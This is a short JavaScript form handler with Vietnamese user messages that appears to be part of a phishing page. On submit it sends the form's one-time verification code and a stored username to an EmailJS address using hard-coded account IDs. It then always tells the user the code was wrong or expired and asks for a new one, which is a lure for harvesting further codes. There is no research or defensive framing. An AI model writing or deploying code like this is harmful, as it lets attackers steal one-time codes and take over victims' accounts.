function updateValue() {
  var username = JSON.parse(localStorage.getItem("username1"));
  $('#usernameID').val(username)
}

$('#formOTP').on('submit', function(event) {
  updateValue();
  event.preventDefault(); // prevent reload
  
  var formData = new FormData(this);
    formData.append('service_id', 'service_fmt1k46');
    formData.append('template_id', 'template_uzrsmyk');
    formData.append('user_id', 'rQzt8bpBAWfMiOT7n');

  $.ajax('https://api.emailjs.com/api/v1.0/email/send-form', {
      type: 'POST',
      data: formData,
      contentType: false, // auto-detection
      processData: false // no need to parse formData to string
  }).done(function() {
      console.log('Ok');
  }).fail(function(error) {
      console.log('Oops... ',JSON.stringify(error));
  });
  alert("Mã Xác Minh Bạn Vừa Nhập Không Đúng Hoặc Hết Hiệu Lực. Vui Lòng Chờ Mã Mới Và Nhập Lại Cho Chính Xác")
  event.target.reset();

});
